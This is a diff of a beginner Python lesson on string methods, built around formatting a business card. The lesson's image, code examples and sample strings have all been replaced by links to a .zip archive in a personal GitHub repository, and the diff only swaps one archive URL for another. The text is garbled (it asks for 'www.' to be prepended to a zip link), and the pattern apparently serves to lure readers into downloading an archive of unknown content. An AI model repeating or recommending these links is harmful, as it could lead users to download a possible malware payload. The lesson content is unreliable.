@@ -15,7 +15,7 @@ Imagine that you're at a business event and exchanged business cards with a few 
 
 The next morning you take out the business card, ready to format it using your programming skills, and here is what we find.
 
-![](https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip)
+![](https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip)
 
 ## String Transformations
 
@@ -26,7 +26,7 @@ Here's a simple example of how you might go about doing this:
 
 ```python
 name = "art vandelay" # "ART VANDELAY"
-https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip()
+https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip()
 ```
 
 If you haven't already, put your cursor into the cell above and press `shift + enter` to run the code in the cell. You should see an updated output produced by the `.upper()` string method. 
@@ -62,14 +62,14 @@ Next, write a method that verifies whether an email addresses is valid. To make 
 
 
 ```python
-"https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip" # False
+"https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip" # False
 ```
 
-As you can see below, the website "https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip" is not preceded by `"www."`. You can perform string concatenation to fix this! string concatenation allows you to join two strings. It works just like numerical addition. For example, ```"This is the start" + "and this is the end"``` would return ```"This is the start and this is the end"```. Use string concatenation to change the website `'https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip'` to the string `'https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip'` by prepending `'www.'`.
+As you can see below, the website "https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip" is not preceded by `"www."`. You can perform string concatenation to fix this! string concatenation allows you to join two strings. It works just like numerical addition. For example, ```"This is the start" + "and this is the end"``` would return ```"This is the start and this is the end"```. Use string concatenation to change the website `'https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip'` to the string `'https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip'` by prepending `'www.'`.
 
 
 ```python
-'https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip' # 'https://raw.githubusercontent.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/master/vagotonia/python-practice-with-datatypes-data-science-intro-000.zip'
+'https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip' # 'https://github.com/BhagyeshJoshi/python-practice-with-datatypes-data-science-intro-000/raw/refs/heads/master/vagotonia/data-intro-datatypes-practice-with-science-python-v2.7.zip'
 ```
 
 ## String Slicing
